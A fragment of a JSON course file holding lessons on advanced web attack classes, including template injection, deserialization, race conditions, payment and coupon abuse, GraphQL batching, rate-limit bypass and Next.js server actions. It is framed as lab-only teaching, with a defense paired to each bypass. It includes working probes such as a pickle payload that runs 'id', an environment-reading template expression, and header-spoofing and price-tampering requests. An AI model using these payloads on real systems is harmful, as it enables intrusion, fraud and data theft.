+    "content": "## Core idea\nModern stacks often assume that template engines are safe because they autoescape. That assumption confuses two separate properties: output escaping protects markup, while template compilation evaluates expressions. Go illustrates the distinction well: `html/template` applies context-aware escaping to rendered values, whereas `text/template` performs no escaping at all. If user input is compiled as the template itself, both engines will evaluate template actions such as method calls, pipelines, and inclusions.\n\nThe mental model is a capability set supplied by the engine. Go templates expose methods on the data object, built-in functions, and the `template` action for inclusion. Handlebars and Mustache expose helpers and partials, which can be dangerous if helpers perform IO or if prototype properties are reachable. Third-party function libraries such as Sprig add environment and command functions that turn an injection into a direct primitive. The engine's sandbox, if any, is a policy layer, not a security boundary.\n\n### Step-by-step method (lab only)\n1. Submit detection probes to <LAB_HOST> and classify the engine from syntax and error messages.\n2. Determine which template package or helper library is in use and list available functions.\n3. Test context-aware escaping by injecting values into HTML, attribute, and URL contexts separately.\n4. Probe method calls on supplied data objects using harmless markers.\n5. Verify whether user input can be compiled as a template at all; if not, the issue is likely ordinary injection.\n\n### Concrete example\n```gotemplate\n{{.User.Name}}\n{{printf \"%s\" .Value}}\n{{template \"header\" .}}\n```\nIf an attacker controls the template string, a function such as `{{env \"HOME\"}}` from a function library reveals environment data. With Handlebars:\n```text\n{{#with this}}{{constructor.name}}{{/with}}\n```\nprobes prototype reachability.\n\n| Engine | Escaping | Execution surface |\n|---|---|---|\n| Go html/template | Context-aware | Methods, functions |\n| Go text/template | None | Methods, functions |\n| Handlebars | HTML escaping | Helpers, partials |\n| Mustache | HTML escaping | Sections, lambdas |\n\n### Bypass and defense pairs\n- Bypass: escaped input that is later compiled as a template. Defense: keep templates static and pass user data only as values.\n- Bypass: a helper that writes raw HTML. Defense: allowlist helpers and forbid user-defined helpers.\n\n### Additional surface\nTemplate inclusion is frequently overlooked: a parameter that selects a template by name can sometimes traverse to unintended files. Validate template names against a strict allowlist. Also record the exact engine version, because function libraries evolve and older releases may expose dangerous built-ins that newer ones removed.\n\n### Common mistakes\n- Assuming autoescaping prevents expression evaluation.\n- Using text/template where html/template was intended.\n- Allowing user-selected template names.\n\n### Knowledge check\n**Q:** Why is html/template still unsafe if user input is compiled as the template?\n**A:** Because escaping applies to interpolated values, not to template actions that the compiler parses and executes."
+  },
+  {
+    "id": "web-security-advanced-32",
+    "topic": "web-security-advanced",
+    "number": 32,
+    "title": "Deserialization Gadgets in PHP, Python, and .NET",
+    "level": "Advanced",
+    "minutes": 90,
+    "summary": "Survey runtime-specific deserialization formats and the gadget primitives they expose across common server stacks.",
+    "objectives": [
+      "Recognize serialized formats per runtime",
+      "Map a gadget to an observable effect",
+      "Replace unsafe deserializers"
+    ],
+    "takeaways": [
+      "Each runtime has a dangerous-by-design deserializer",
+      "Gadgets assemble existing code",
+      "Magic methods initiate chains"
+    ],
+    "practice": "In a local Python service at <LAB_HOST>, deserialize a harmless marker pickle in your own lab and confirm the effect.",
+    "sources": [],
+    "content": "## Core idea\nNative deserialization formats are dangerous because reconstruction itself invokes code. PHP's `unserialize()` calls magic methods such as `__wakeup` and `__destruct`, enabling property-oriented programming chains that end in file writes or command execution. Python's `pickle` is a stack machine whose `REDUCE` opcode can call arbitrary callables. .NET's `BinaryFormatter` reconstructs object graphs with type resolvers that can be abused. Node's `node-serialize` IIFE pattern is a smaller but similar example.\n\nThe mental model is format-specific: identify the serialized dialect, then determine which classes are available and which magic method or opcode provides the first effect. PHP chains are described by entry and termination classes; Python payloads are short opcode sequences; .NET chains depend heavily on available assemblies. Unlike Java, some of these formats let the payload directly name a function, which lowers the bar but also makes detection easier through pattern matching.\n\n### Step-by-step method (lab only)\n1. Identify serialized data at <LAB_HOST> from its shape: PHP object markers, pickle opcodes, or binary headers.\n2. Confirm the deserialization point through a controlled error or timing signal.\n3. Enumerate available classes and functions through errors or a debug endpoint in your lab.\n4. Construct a harmless marker payload appropriate to the runtime.\n5. Verify the effect and replace the deserializer with a safe format such as JSON.\n\n### Concrete example\n```python\npickle.loads(base64.b64decode(data))\n# minimal marker payload concept:\n# b\"cos\\nsystem\\n(S'id'\\ntR.\"\n```\nPHP object form:\n```text\nO:8:\"Example\":1:{s:4:\"file\";s:9:\"/tmp/mark\";}\n```\nBoth use the application's own trust in reconstructed objects.\n\n| Runtime | Format | Entry point |\n|---|---|---|\n| PHP | `O:` object notation | `__wakeup`/`__destruct` |\n| Python | Pickle opcodes | `REDUCE` |\n| .NET | BinaryFormatter | Type resolvers |\n| Node | node-serialize | IIFE wrapper |\n\n### Bypass and defense pairs\n- Bypass: a filter that blocks the word `system` but allows another callable. Defense: avoid native deserialization of untrusted data entirely.\n- Bypass: signed-looking data whose signature is not actually verified. Defense: verify signatures before deserialization and use authenticated encryption.\n\n### Additional surface\nMagic methods can trigger on garbage collection, not only during deserialization, so a chain may fire after the request appears complete. This makes impact easy to miss in logs. Focus detection on the deserialization boundary and on surprising outbound connections from the application process.\n\n### Common mistakes\n- Treating Base64 encoding as protection.\n- Assuming JSON-based transports eliminate the risk when a field is later deserialized.\n- Using destructive proof payloads outside a dedicated lab.\n\n### Knowledge check\n**Q:** Why can a PHP deserialization chain fire after the request finishes?\n**A:** Because destructor magic methods run during garbage collection, which may occur after the response is sent."
+  },
+  {
+    "id": "web-security-advanced-33",
+    "topic": "web-security-advanced",
+    "number": 33,
+    "title": "Business Limit Overruns and Constraint Confusion",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how numeric and structural business limits are bypassed when validation and enforcement use different representations.",
+    "objectives": [
+      "Inventory business constraints and their enforcement points",
+      "Test boundary and encoding variants",
+      "Enforce limits atomically"
+    ],
+    "takeaways": [
+      "Limits are invariants, not suggestions",
+      "Client-side limits are not controls",
+      "Validation and enforcement must use one representation"
+    ],
+    "practice": "Against a local ordering API at <LAB_HOST>, test boundary quantities, duplicate fields, and oversized item arrays with harmless values.",
+    "sources": [],
+    "content": "## Core idea\nApplications express business limits as numbers: maximum quantity, minimum price, maximum items, retry counts, and balance ceilings. Bugs appear when the value that is validated is not the value that is used. A front-end may cap quantity at 10 while the API accepts 10000; a validator may inspect the first occurrence of a duplicate JSON key while the parser keeps the last; a limit may be applied per request while the attacker splits an order across many requests.\n\nThe mental model is an invariant that must hold at the authoritative moment of use. Any earlier check is advisory. The gap usually comes from representation changes: string to integer, decimal to float, array to count, or encoded to decoded form. Units are another source: a limit in cents may be compared against a value supplied in dollars.\n\n### Step-by-step method (lab only)\n1. Inventory every limit at <LAB_HOST> and record where it is enforced.\n2. Test boundary values just inside and outside the limit.\n3. Test alternate representations: strings, exponent notation, duplicate keys, and arrays.\n4. Test splitting a single logical operation across multiple requests.\n5. Confirm the final persisted effect rather than trusting the API response.\n\n### Concrete example\n```json\n{\"itemId\":\"SKU1\",\"quantity\":\"1e3\"}\n{\"itemId\":\"SKU1\",\"quantity\":1,\"quantity\":10000}\n{\"items\":[\"SKU1\",\"SKU1\",\"SKU1\"]}\n```\nIf the validator reads the first `quantity` and the order service reads the last, the limit is bypassed. Similarly, a 1000-item array may pass a per-item check while violating a total-count constraint.\n\n| Limit | Weak enforcement | Strong enforcement |\n|---|---|---|\n| Quantity | Front-end max | Recheck at commit |\n| Amount | Float comparison | Integer minor units |\n| Item count | Per-request | Per-order aggregate |\n\n### Bypass and defense pairs\n- Bypass: exponent notation parsed as a number late. Defense: parse once into a strongly typed value and validate that value.\n- Bypass: duplicate JSON keys. Defense: reject documents with duplicate keys.\n\n### Additional surface\nTime-based limits deserve the same treatment: a \"one per day\" rule that records the check time rather than the completion time can be raced. Currency and unit confusion across microservices is another frequent source of overruns; make the unit explicit in the data model rather than in comments.\n\n### Common mistakes\n- Trusting the response's success flag as proof the limit held.\n- Validating a decoded value but persisting the raw value.\n- Ignoring aggregate limits across related records.\n\n### Knowledge check\n**Q:** Why is client-side validation not a security control for limits?\n**A:** Because an attacker controls the client and can send any request directly to the API, bypassing the validation entirely."
+  },
+  {
+    "id": "web-security-advanced-34",
+    "topic": "web-security-advanced",
+    "number": 34,
+    "title": "Time-of-Check to Time-of-Use Race Conditions",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Learn to find and exploit split check-then-act sequences in web applications using controlled concurrency.",
+    "objectives": [
+      "Identify TOCTOU pairs in code paths",
+      "Build a safe concurrent lab test",
+      "Apply atomic mitigations"
+    ],
+    "takeaways": [
+      "A gap between check and use is a race window",
+      "Concurrency turns tiny windows into reliable exploits",
+      "Atomic operations remove the window"
+    ],
+    "practice": "In a local coupon lab at <LAB_HOST>, fire two parallel redemption requests and count how many succeed against a single-use code.",
+    "sources": [],
+    "content": "## Core idea\nA time-of-check to time-of-use race occurs when a program validates a condition and then performs an action based on it, using state that can change between the two steps. Web applications create these windows constantly: check inventory then decrement, check coupon unused then mark used, check balance then transfer, check path then open file. The mental model is a split decision: the check observes a snapshot, while the use acts on live state. Any attacker who can interleave requests between the steps acts on stale information.\n\nUnlike memory-corruption races, web races are usually logical and highly reproducible. The window is often milliseconds, which is plenty when you issue many parallel requests. Reliability improves when you find a deliberately slow step between check and use, such as an external call or a large computation. Impact ranges from limit overruns to double spending and authorization bypass.\n\n### Step-by-step method (lab only)\n1. At <LAB_HOST>, find check-then-act pairs by reading code or by observing state changes across steps.\n2. Identify mutable state shared between the check and the use.\n3. Synchronize parallel requests so they arrive together, using a barrier in your lab harness.\n4. Measure how many operations succeed versus the intended limit.\n5. Repeat with small timing offsets to confirm the window and its boundary.\n\n### Concrete example\n```http\nPOST /coupon/redeem HTTP/1.1\nHost: <LAB_HOST>\nContent-Type: application/json\n\n{\"code\":\"SINGLE-USE\"}\n```\nTwo parallel requests may both observe `used=false` before either writes `used=true`. If both then complete the discount, the invariant is violated.\n\n| Pattern | Race window | Consequence |\n|---|---|---|\n| Check balance, then debit | Between read and write | Double spend |\n| Check code, then redeem | Between read and write | Reuse |\n| Check path, then open | Between stat and open | File swap |\n\n### Bypass and defense pairs\n- Bypass: many parallel requests with slightly staggered timing. Defense: perform check and mutation in one atomic database transaction with row locks.\n- Bypass: a slow external call inside the window. Defense: move validation after the slow step or reserve state before it.\n\n### Additional surface\nNot every concurrency bug is a classic TOCTOU. Some are \"last write wins\" overwrites where two legitimate updates collide and one is lost. Test both success counts and final state values, since a system can report two successes while persisting only one change, or report one success while applying both effects.\n\n### Common mistakes\n- Assuming a single-threaded language eliminates races; the database is still shared.\n- Testing sequentially and concluding the system is safe.\n- Ignoring retries, which multiply the number of operations.\n\n### Knowledge check\n**Q:** Why do parallel requests expose a race that sequential testing misses?\n**A:** Because only concurrent interleaving can place one request between another request's check and its use."
+  },
+  {
+    "id": "web-security-advanced-35",
+    "topic": "web-security-advanced",
+    "number": 35,
+    "title": "Idempotency Key Abuse and Deduplication Flaws",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Analyze idempotency mechanisms as deduplication maps and find flaws in key scope, persistence, and response handling.",
+    "objectives": [
+      "Test key reuse and cross-user collisions",
+      "Verify atomic persistence of key and effect",
+      "Design robust idempotency"
+    ],
+    "takeaways": [
+      "Keys must be unique per logical operation and per caller",
+      "Reuse must return the original result deterministically",
+      "Concurrent same-key requests need locking"
+    ],
+    "practice": "Against a local payments API at <LAB_HOST>, reuse an idempotency key across two users and across two endpoints to map key scope.",
+    "sources": [],
+    "content": "## Core idea\nIdempotency keys make retries safe by mapping a client-generated token to one authoritative operation. The mechanism is a deduplication map: on first use, the server performs the effect and stores the result; on reuse, it replays the stored result. Bugs arise when the key is scoped too broadly or too narrowly, when the mapping is not persisted atomically with the effect, or when invalid keys are accepted without validation.\n\nThe mental model is a two-part transaction. The key and the side effect must commit together; otherwise a crash between them produces either a duplicate operation or a replay with no effect. Key scope must include the caller and the operation type, so one user cannot retrieve another user's stored response and so a payment key cannot be reused for a refund. Concurrent requests with the same key need a lock or unique constraint, not just a read-then-check.\n\n### Step-by-step method (lab only)\n1. Identify where <LAB_HOST> accepts idempotency keys: header, query, or body.\n2. Reuse the same key twice and compare responses and persisted effects.\n3. Reuse the key from a second authenticated user to test scope.\n4. Reuse the key against a different endpoint or operation type.\n5. Fire parallel requests with the same key and count the effects.\n\n### Concrete example\n```http\nPOST /payments HTTP/1.1\nHost: <LAB_HOST>\nAuthorization: Bearer <TOKEN_A>\nIdempotency-Key: 7f3c9a21\nContent-Type: application/json\n\n{\"amount\":100,\"currency\":\"USD\"}\n```\nIf TOKEN_B with the same key receives TOKEN_A's response and no new charge, the key is not scoped to the caller.\n\n| Flaw | Test | Fix |\n|---|---|---|\n| Global key | Cross-user reuse | Include caller ID |\n| Non-atomic store | Crash between steps | Single transaction |\n| No validation | Arbitrary key values | Format and length checks |\n\n### Bypass and defense pairs\n- Bypass: concurrent same-key requests both pass the initial check. Defense: unique database constraint on the key with conflict handling.\n- Bypass: key reused across endpoints. Defense: include endpoint and operation type in the storage key.\n\n### Additional surface\nStored responses can themselves leak data: if replay returns the full original response, an attacker who guesses a key may retrieve another user's result. Scope the stored response to the authenticated caller and expire old entries. Also check whether failed operations consume keys, which can be used to poison a legitimate retry.\n\n### Common mistakes\n- Treating idempotency as a rate limit.\n- Generating keys server-side from predictable request properties.\n- Forgetting to hash or truncate very long keys before storage.\n\n### Knowledge check\n**Q:** Why must the key and the effect commit atomically?\n**A:** Otherwise a failure between the two steps causes either a duplicate effect on retry or a replayed response for an operation that never happened."
+  },
+  {
+    "id": "web-security-advanced-36",
+    "topic": "web-security-advanced",
+    "number": 36,
+    "title": "Workflow Bypass and State Machine Abuse",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn to bypass multi-step workflows by calling later states directly, replaying transitions, or forging state parameters.",
+    "objectives": [
+      "Map workflow states and transitions",
+      "Test direct and out-of-order calls",
+      "Enforce transitions server-side"
+    ],
+    "takeaways": [
+      "Workflows are graphs with guarded edges",
+      "Entry checks do not protect later transitions",
+      "Client-supplied state is untrusted"
+    ],
+    "practice": "In a local checkout lab at <LAB_HOST>, call the final confirmation endpoint directly and observe whether earlier required steps are enforced.",
+    "sources": [],
+    "content": "## Core idea\nMulti-step workflows such as checkout, onboarding, and approval are state machines. Each transition should be authorized and validated independently. Bugs appear when only the first step is guarded, when transitions are inferred from a client-supplied state field, or when later steps assume earlier steps happened. The mental model is a directed graph: security must be attached to edges, not just to the entry node. If a node is reachable through a direct request, its prerequisites must be revalidated.\n\nCommon variants include skipping payment to reach fulfillment, replaying an earlier step to reset state, moving backward to re-trigger a side effect, and forging a state parameter to make the server believe a prerequisite was completed. Workflows implemented across multiple services are especially fragile because each service may trust a message from another without verifying the state.\n\n### Step-by-step method (lab only)\n1. Map the states and transitions of the workflow at <LAB_HOST> by walking it normally.\n2. Record every endpoint and the parameters that appear to encode state.\n3. Call later endpoints directly with a valid object identifier.\n4. Replay earlier requests after the workflow advanced.\n5. Tamper state values and observe whether unauthorized transitions are accepted.\n\n### Concrete example\n```http\nPOST /checkout/confirm HTTP/1.1\nHost: <LAB_HOST>\nContent-Type: application/json\n\n{\"orderId\":\"ORD-1042\",\"step\":\"complete\"}\n```\nIf the server trusts `step` rather than its own persisted state, the payment step is skipped. A robust implementation reads the only valid next state from the server-side record.\n\n| Attack | Assumption broken |\n|---|---|\n| Direct later step | Prerequisite was completed |\n| Replay earlier step | Transition is one-way |\n| Forge state field | Server owns state |\n\n### Bypass and defense pairs\n- Bypass: changing a hidden form field to jump states. Defense: derive state solely from server storage.\n- Bypass: calling the webhook that advances state directly. Defense: authenticate internal transitions and validate signatures.\n\n### Additional surface\nParallel transitions deserve attention too: two simultaneous requests may both believe they own the current state and apply conflicting updates. Use optimistic concurrency control with a version column so only one transition succeeds. Also verify that canceled or expired objects cannot be revived by late requests.\n\n### Common mistakes\n- Relying on the order of browser navigation.\n- Assuming an internal endpoint is unreachable from the internet.\n- Validating prerequisites only in the UI.\n\n### Knowledge check\n**Q:** Why is a client-supplied state field unsafe even if it is signed?\n**A:** Because signing proves integrity, not authorization; a user may legitimately possess a signed value for a state they are not allowed to transition to."
+  },
+  {
+    "id": "web-security-advanced-37",
+    "topic": "web-security-advanced",
+    "number": 37,
+    "title": "Payment and Quantity Abuse Patterns",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Study economic logic abuse through negative values, fractional units, currency mismatch, price tampering, and rounding errors.",
+    "objectives": [
+      "Test monetary fields for client-controlled pricing",
+      "Detect unit and currency confusion",
+      "Recompute totals authoritatively"
+    ],
+    "takeaways": [
+      "The server must derive price from catalog data",
+      "Negative and fractional values are common primitives",
+      "Integer minor units avoid float errors"
+    ],
+    "practice": "In a local store at <LAB_HOST>, submit a harmless negative quantity and a mismatched currency to see which values the server trusts.",
+    "sources": [],
+    "content": "## Core idea\nPayment logic is a calculation over untrusted inputs. If any input that affects the total comes from the client, the attacker can rewrite the economics of the transaction. Typical primitives are negative quantities, zero or negative prices, fractional values that exploit rounding, currency mismatches across services, repeated coupons, and tampered item identifiers. The mental model is a chain of derived values: catalog price -> discount -> tax -> total. Each step must be recomputed from authoritative data, never from a client-provided intermediate result.\n\nFloating-point money is a subtle source of bugs. A value like 0.1 cannot be represented exactly, so repeated additions can round in the attacker's favor. Storing amounts as integer minor units, such as cents, removes this class. Unit confusion is equally dangerous: one service may treat an amount as cents while another treats it as dollars, creating a factor-of-100 discrepancy.\n\n### Step-by-step method (lab only)\n1. Capture a complete purchase request at <LAB_HOST> and list every field affecting the total.\n2. Test negative, zero, fractional, and very large quantities with harmless items.\n3. Test price, subtotal, and total fields supplied by the client.\n4. Test currency changes and coupon stacking.\n5. Compare the persisted charge with the server-side recomputation.\n\n### Concrete example\n```json\n{\n  \"itemId\": \"SKU1\",\n  \"quantity\": -5,\n  \"unitPrice\": 0.01,\n  \"currency\": \"USD\",\n  \"coupon\": [\"SAVE10\", \"SAVE10\"]\n}\n```\nIf `unitPrice` is trusted, the attacker controls the price. If negative quantity is accepted, the total may become a credit.\n\n| Primitive | Effect | Defense |\n|---|---|---|\n| Negative quantity | Credit or refund | Range validation |\n| Client price | Arbitrary total | Catalog lookup |\n| Currency mismatch | Unit confusion | Single currency per order |\n| Coupon stacking | Unbounded discount | One coupon, atomic use |\n\n### Bypass and defense pairs\n- Bypass: fractional quantity that rounds down at each line item. Defense: integer quantities and integer minor units.\n- Bypass: swapping currency after total calculation. Defense: bind currency to the order at creation.\n\n### Additional surface\nRefund and credit paths deserve equal scrutiny. A negative amount in a purchase may be rejected while the same amount in a refund endpoint is accepted, producing the same economic effect. Test every endpoint that changes a balance, not just checkout.\n\n### Common mistakes\n- Trusting a recomputed total that is returned but not persisted.\n- Allowing the client to choose the currency at the final step.\n- Ignoring refunds, credits, and loyalty redemption paths.\n\n### Knowledge check\n**Q:** Why are integer minor units safer than floating-point for money?\n**A:** Because they avoid binary rounding errors that accumulate and can be exploited through many small fractional transactions."
+  },
+  {
+    "id": "web-security-advanced-38",
+    "topic": "web-security-advanced",
+    "number": 38,
+    "title": "GraphQL Batching and Alias Abuse",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Examine how batched operations and aliases amplify cost, bypass rate limits, and confuse authorization checks.",
+    "objectives": [
+      "Test batched and aliased queries safely",
+      "Measure complexity amplification",
+      "Apply per-operation limits"
+    ],
+    "takeaways": [
+      "Batching multiplies cost while many limiters count requests",
+      "Aliases can evade field-name checks",
+      "GET-based queries enable cross-origin data theft"
+    ],
+    "practice": "Against a local GraphQL endpoint at <LAB_HOST>, send a small harmless batch of aliases and compare it to separate requests.",
+    "sources": [],
+    "content": "## Core idea\nGraphQL lets clients send multiple operations in one request and rename fields with aliases. Both features are legitimate but they change the security accounting. A rate limiter that counts HTTP requests sees one request where the server executes hundreds of operations. A field-level authorization filter that matches response keys can be evaded by aliasing a sensitive field to an innocuous name. Deeply nested batched queries can amplify server cost dramatically.\n\nThe mental model is a multiplier: the cost of a request is the product of query complexity and batch size. Defenses must measure that product, not the request count. GET-based queries add a cross-origin angle because a URL can be embedded in an image or script tag, and a permissive CORS policy can make responses readable. Introspection and batching together can also accelerate schema discovery.\n\n### Step-by-step method (lab only)\n1. Confirm that <LAB_HOST> accepts batched arrays of operations.\n2. Send a small harmless batch and measure the response time and result count.\n3. Test aliases on a sensitive field to see whether any authorization depends on response key names.\n4. Measure depth and complexity limits with a moderately nested query.\n5. Test whether rate limits apply per request or per operation.\n\n### Concrete example\n```json\n[\n  {\"query\":\"{ a: user(id:\\\"A\\\") { email } }\"},\n  {\"query\":\"{ b: user(id:\\\"B\\\") { email } }\"}\n]\n```\nIf authorization checks the alias name rather than the underlying field, the second operation may slip through. A depth probe:\n```graphql\n{ user { friends { friends { friends { email } } } } }\n```\n\n| Feature | Abuse | Control |\n|---|---|---|\n| Batching | Rate-limit bypass | Count operations |\n| Aliases | Field-name filter bypass | Check field definitions |\n| Nesting | Cost amplification | Depth and complexity limits |\n\n### Bypass and defense pairs\n- Bypass: splitting one expensive query across many batched entries. Defense: sum complexity across the whole batch.\n- Bypass: GET query embedded cross-origin. Defense: require POST for authenticated operations and validate content type.\n\n### Additional surface\nSubscriptions and file uploads introduce separate channels that may be excluded from query-level limits. Persisted queries are a strong control because the server executes only preapproved documents, eliminating arbitrary structure at runtime.\n\n### Common mistakes\n- Counting HTTP requests instead of operations.\n- Authorizing on alias names.\n- Forgetting complexity limits on mutation fields.\n\n### Knowledge check\n**Q:** Why does batching defeat a request-count rate limiter?\n**A:** Because one HTTP request can contain many operations, so the limiter undercounts the work the server performs."
+  },
+  {
+    "id": "web-security-advanced-39",
+    "topic": "web-security-advanced",
+    "number": 39,
+    "title": "Coupon, Referral, and Loyalty Abuse",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study promotional systems as financial state machines vulnerable to reuse, stacking, self-referral, and eligibility errors.",
+    "objectives": [
+      "Test single-use enforcement under concurrency",
+      "Detect stacking and eligibility gaps",
+      "Design atomic promotion redemption"
+    ],
+    "takeaways": [
+      "Promotions change balances and need atomic enforcement",
+      "Concurrency defeats naive single-use flags",
+      "Eligibility must be rechecked at redemption"
+    ],
+    "practice": "In a local loyalty lab at <LAB_HOST>, redeem a single-use coupon twice in parallel and count successful applications.",
+    "sources": [],
+    "content": "## Core idea\nCoupons, referrals, and loyalty points are financial state transitions disguised as growth features. They fail for the same reasons payment logic fails: checks and mutations are split, eligibility is evaluated at the wrong time, and multiple discounts can stack. The mental model is a ledger. Every promotion writes to a balance or an order total, and that write must be atomic, idempotent, and constrained by server-side policy.\n\nCommon bugs include reusing a code because `used=false` is read before it is written, applying two coupons when the UI only allows one, self-referral creating infinite signup credit, using a code on ineligible items, and replaying a redemption request to add points repeatedly. Expiry times evaluated in the client's time zone create additional edge cases.\n\n### Step-by-step method (lab only)\n1. Enumerate promotion entry points at <LAB_HOST>: checkout fields, referral links, and point-redemption endpoints.\n2. Test a single-use code twice sequentially and then in parallel.\n3. Test two codes together to see whether stacking is blocked server-side.\n4. Test self-referral and referral of an existing account.\n5. Test eligibility by applying a code to an excluded item and after expiry.\n\n### Concrete example\n```http\nPOST /checkout/apply-coupon HTTP/1.1\nHost: <LAB_HOST>\nContent-Type: application/json\n\n{\"code\":\"SINGLE10\",\"orderId\":\"ORD-1042\"}\n```\nTwo parallel requests may both pass the unused check. A referral probe:\n```json\n{\"referrer\":\"<OWN_ACCOUNT>\",\"referee\":\"<OWN_ACCOUNT>\"}\n```\n\n| Abuse | Server error | Fix |\n|---|---|---|\n| Code reuse | Read then write | Atomic claim |\n| Stacking | No global constraint | One coupon per order |\n| Self-referral | No identity check | Distinct accounts |\n| Expiry bypass | Client time | Server clock |\n\n### Bypass and defense pairs\n- Bypass: parallel redemption. Defense: unique constraint on code use with a transaction.\n- Bypass: applying a coupon then changing the cart. Defense: revalidate eligibility at checkout commit.\n\n### Additional surface\nLoyalty balances can be manipulated through replayed credit requests or through rounding when points convert to currency. Treat point issuance as a privileged operation with an audit trail, and verify that refunds reverse both the payment and the points.\n\n### Common mistakes\n- Trusting the UI to prevent stacking.\n- Using a boolean flag without a database constraint.\n- Assuming referral codes are low value and not worth protecting.\n\n### Knowledge check\n**Q:** Why does a unique constraint on code use stop concurrent redemption?\n**A:** Because the database rejects the second insert or update that marks the same code used, forcing one request to fail."
+  },
+  {
+    "id": "web-security-advanced-40",
+    "topic": "web-security-advanced",
+    "number": 40,
+    "title": "Rate Limiting and Resource Exhaustion Logic",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how limiters key on imperfect identity and cost signals, and how expensive endpoints turn small requests into large loads.",
+    "objectives": [
+      "Identify the limiter's identity key",
+      "Bypass header-based and per-endpoint limits",
+      "Measure true request cost"
+    ],
+    "takeaways": [
+      "Limiters count a proxy for identity and cost",
+      "Expensive endpoints defeat request-count limits",
+      "Compression and nesting amplify work"
+    ],
+    "practice": "Against a local API at <LAB_HOST>, vary client-IP headers and measure how the rate limit responds in your own lab.",
+    "sources": [],
+    "content": "## Core idea\nRate limiting is a control over identity and cost, but both are usually approximated. The limiter may key on a client-supplied IP header, a session cookie, or an API key, and may count requests rather than work. If the identity key can be changed, the attacker gets a fresh bucket. If the cost metric ignores expensive endpoints, a few requests can consume enormous resources. The mental model is two divergences: attacker-controlled identity versus real identity, and request count versus actual work.\n\nCommon bypasses include spoofing `X-Forwarded-For` when the edge does not overwrite it, rotating API keys or accounts, using different paths that share a handler, and exploiting batching. Resource exhaustion comes from deep query nesting, large payloads, decompression bombs, and catastrophic regular expressions. Defenses should key on authenticated identity where possible, normalize forwarded headers at the edge, and apply cost-based limits using query complexity or payload size.\n\n### Step-by-step method (lab only)\n1. Determine the limiter's key at <LAB_HOST> by observing which changes reset the bucket.\n2. Test client-IP headers, cookies, and API keys independently.\n3. Test equivalent endpoints and content types for separate buckets.\n4. Measure server time for small versus large payloads and deep versus shallow queries.\n5. Verify that the limiter accounts for batch size and nesting depth.\n\n### Concrete example\n```http\nPOST /api/search HTTP/1.1\nHost: <LAB_HOST>\nX-Forwarded-For: 203.0.113.7\nContent-Type: application/json\n\n{\"query\":\"a\".repeat(100000)}\n```\nIf the edge trusts the forwarded header, each value creates a new bucket. A deeply nested GraphQL query similarly inflates cost while counting as one request.\n\n| Signal | Weakness | Stronger approach |\n|---|---|---|\n| Client IP header | Spoofable | Edge-overwritten value |\n| Request count | Ignores cost | Complexity score |\n| Per-endpoint | Shared handlers | Handler-level limit |\n\n### Bypass and defense pairs\n- Bypass: rotating forwarded-for values. Defense: overwrite forwarded headers at the trusted edge and discard client copies.\n- Bypass: decompression bomb inside a small compressed body. Defense: limit decompressed size and processing time.\n\n### Additional surface\nDistributed sources defeat naive per-IP limits, so pair them with global budgets on expensive operations. Also ensure that rejections are cheap: a limiter that performs full parsing before rejecting offers little protection.\n\n### Common mistakes\n- Trusting forwarded headers without sanitizing them.\n- Applying limits only to login and forgetting expensive read endpoints.\n- Ignoring CPU cost in favor of connection counts.\n\n### Knowledge check\n**Q:** Why is a complexity-based limit stronger than a request-count limit for GraphQL?\n**A:** Because complexity measures the work a query requests, including nesting and batching, rather than the number of HTTP requests."
+  },
+  {
+    "id": "web-security-advanced-41",
+    "topic": "web-security-advanced",
+    "number": 41,
+    "title": "Next.js and React Server Components Security",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Analyze the Flight serialization boundary and server actions as an RPC surface with its own authorization needs.",
+    "objectives": [
+      "Inspect RSC payloads and action identifiers",
+      "Test server action authorization and CSRF",
+      "Harden cache and action boundaries"
+    ],
+    "takeaways": [
+      "RSC payloads are serialized instructions",
+      "Server actions are RPC endpoints requiring authz",
+      "Cache keys must include action-relevant state"
+    ],
+    "practice": "In a local Next.js app at <LAB_HOST>, inspect a server action request and replay it with modified arguments using an owned account.",
+    "sources": [],
+    "content": "## Core idea\nReact Server Components move rendering to the server and send a serialized Flight payload to the client. Server actions are RPC-like endpoints addressed by generated identifiers. The security boundary is the serialization format: every reference in a Flight payload is an instruction the client or server will interpret. Bugs in this stack include missing authorization on server actions, reliance on CSRF protections that do not apply to the action transport, prototype manipulation during deserialization, and cache keys that ignore personalized state.\n\nThe mental model is an RPC framework embedded in a page. A server action is a function reachable by an identifier that may be discoverable from the client bundle. If authorization is performed in the component that renders a button but not inside the action, calling the action directly bypasses it. Because actions are invoked with POST requests, origin and content-type checks matter, and framework versions have had significant vulnerabilities around deserialization and routing.\n\n### Step-by-step method (lab only)\n1. Identify the framework version and router mode at <LAB_HOST> from headers and bundles.\n2. Inspect network requests for `text/x-component` responses and `Next-Action`-style headers.\n3. Extract action identifiers from the client bundle and call them directly with your owned account.\n4. Test origin and content-type validation by replaying an action from an owned second origin.\n5. Test whether cached RSC responses vary by user, cookie, and request headers.\n\n### Concrete example\n```http\nPOST / HTTP/1.1\nHost: <LAB_HOST>\nNext-Action: <ACTION_ID>\nContent-Type: multipart/form-data; boundary=...\n```\nA tampered argument:\n```json\n[\"<ORDER_ID>\", \"<ROLE_ADMIN>\"]\n```\nIf the action trusts the second argument, privilege escalation occurs.\n\n| Surface | Risk | Control |\n|---|---|---|\n| Action ID | Direct invocation | Authz inside action |\n| RSC payload | Deserialization bugs | Patch framework |\n| Cache key | Cross-user HTML | Vary by identity |\n\n### Bypass and defense pairs\n- Bypass: calling an action without the UI that normally guards it. Defense: authorize inside every action using the session.\n- Bypass: cross-origin action invocation. Defense: enforce origin and content-type checks at the framework or edge.\n\n### Additional surface\nPrototype manipulation in serialized payloads can affect client hydration as well as server processing. Treat deserialized objects as untrusted and avoid spreading them into application configuration. Also verify that personalized data is never embedded in a publicly cacheable RSC response.\n\n### Common mistakes\n- Assuming the framework handles authorization automatically.\n- Reading action identifiers as secrets; they are often public.\n- Ignoring cache behavior for streamed responses.\n\n### Knowledge check\n**Q:** Why must authorization live inside a server action rather than in the component that renders it?\n**A:** Because the action is directly callable by identifier; the rendering component is not part of the request path when an attacker invokes it."
+  },
